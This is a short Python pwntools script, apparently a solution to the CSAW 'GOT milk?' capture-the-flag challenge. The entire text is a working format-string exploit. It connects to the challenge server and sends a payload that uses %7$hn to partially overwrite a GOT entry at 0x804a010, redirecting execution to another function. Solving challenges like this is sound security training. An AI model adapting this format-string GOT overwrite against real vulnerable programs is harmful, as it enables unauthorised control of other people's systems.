def pwn():
    p = remote("pwn.chal.csaw.io", 8000)
    p.recvuntil(b"GOT milk? ")
    # Partial overwrite of lose GOT low 2 bytes: 0x11f8 -> 0x1189
    target = 0x1189
    payload = p32(0x804a010)
    # current printed = 4
    payload += b"%" + str(target - 4).encode() + b"c%7$hn"
    p.sendline(payload)
    data = p.recvall(timeout=3)
    print(data.decode(errors='replace'))

pwn()
